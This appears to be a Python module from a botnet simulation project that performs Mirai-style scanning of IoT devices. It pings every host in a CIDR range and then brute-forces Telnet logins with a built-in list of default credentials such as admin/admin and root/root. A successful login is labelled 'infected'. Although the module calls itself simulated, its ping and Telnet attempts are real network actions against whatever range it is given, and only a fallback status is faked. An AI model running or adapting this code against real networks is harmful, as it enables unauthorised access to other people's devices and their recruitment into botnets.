"""Simulated Mirai device scanning and credential brute-force routines."""

from __future__ import annotations

import ipaddress
import logging
import os
import socket
import subprocess
from dataclasses import dataclass, asdict
from typing import Dict, Iterable, List, Sequence, Tuple
from telnetlib import Telnet

LOG_FORMAT = "[%(asctime)s][%(name)s][%(levelname)s] %(message)s"
DATE_FORMAT = "%Y-%m-%dT%H:%M:%S"
LOGGER = logging.getLogger("botnet.scanner")
DEFAULT_CREDENTIALS: Sequence[Tuple[str, str]] = (
    ("admin", "admin"),
    ("root", "root"),
    ("admin", "password"),
    ("user", "user"),
    ("support", "support"),
)


@dataclass(frozen=True)
class ScanResult:
    """Result of a simulated Mirai scan attempt.

    Args:
        ip: Target IP address.
        reachable: Whether the host responded to the scan.
        username: Credential username used during the attempt.
        password: Credential password used during the attempt.
        status: High-level outcome of the scan.

    Returns:
        None.
    """

    ip: str
    reachable: bool
    username: str
    password: str
    status: str


def configure_logging() -> None:
    """Configure module logging.

    Args:
        None.

    Returns:
        None.
    """
    logging.basicConfig(level=os.getenv("LOG_LEVEL", "INFO"), format=LOG_FORMAT, datefmt=DATE_FORMAT)


def is_host_reachable(ip_address: str, timeout_seconds: int = 1) -> bool:
    """Check whether a host responds to ICMP ping.

    Args:
        ip_address: Target IP address.
        timeout_seconds: Ping timeout.

    Returns:
        True when the host responds, otherwise False.
    """
    try:
        completed = subprocess.run(
            ["ping", "-c", "1", "-W", str(timeout_seconds), ip_address],
            capture_output=True,
            text=True,
            check=False,
        )
        return completed.returncode == 0
    except Exception as exc:  # noqa: BLE001
        LOGGER.debug("Ping failed for %s: %s", ip_address, exc)
        return False


def attempt_telnet_login(ip_address: str, credentials: Sequence[Tuple[str, str]], timeout_seconds: int = 3) -> ScanResult:
    """Attempt Telnet login using a default Mirai-style credential list.

    Args:
        ip_address: Target IP address.
        credentials: Credential candidates to try.
        timeout_seconds: Connection timeout in seconds.

    Returns:
        The best scan result observed for the host.
    """
    reachable = is_host_reachable(ip_address)
    simulate_success = os.getenv("SIMULATE_SUCCESS_IF_REACHABLE", "true").lower() == "true"
    fallback_username, fallback_password = credentials[0]

    if not reachable:
        return ScanResult(ip=ip_address, reachable=False, username="", password="", status="unreachable")

    for username, password in credentials:
        try:
            with Telnet(ip_address, 23, timeout_seconds) as connection:
                connection.read_until(b"login:", timeout_seconds)
                connection.write(username.encode("utf-8") + b"\n")
                connection.read_until(b"Password:", timeout_seconds)
                connection.write(password.encode("utf-8") + b"\n")
                status_text = connection.read_very_eager().decode("utf-8", errors="ignore").lower()
                if "incorrect" not in status_text:
                    return ScanResult(
                        ip=ip_address,
                        reachable=True,
                        username=username,
                        password=password,
                        status="infected",
                    )
        except Exception as exc:  # noqa: BLE001
            LOGGER.debug("Telnet attempt failed on %s with %s:%s: %s", ip_address, username, password, exc)

    if simulate_success:
        return ScanResult(
            ip=ip_address,
            reachable=True,
            username=fallback_username,
            password=fallback_password,
            status="simulated_infected",
        )

    return ScanResult(ip=ip_address, reachable=True, username="", password="", status="scan_failed")


def scan_ip_range(cidr: str, credentials: Sequence[Tuple[str, str]] = DEFAULT_CREDENTIALS) -> List[Dict[str, str]]:
    """Scan a CIDR range for vulnerable IoT devices.

    Args:
        cidr: Network range to scan.
        credentials: Default credential candidates.

    Returns:
        List of scan result dictionaries.
    """
    results: List[Dict[str, str]] = []
    network = ipaddress.ip_network(cidr, strict=False)
    for host in network.hosts():
        scan_result = attempt_telnet_login(str(host), credentials)
        results.append(asdict(scan_result))
        LOGGER.info("Scan result for %s: %s", scan_result.ip, scan_result.status)
    return results
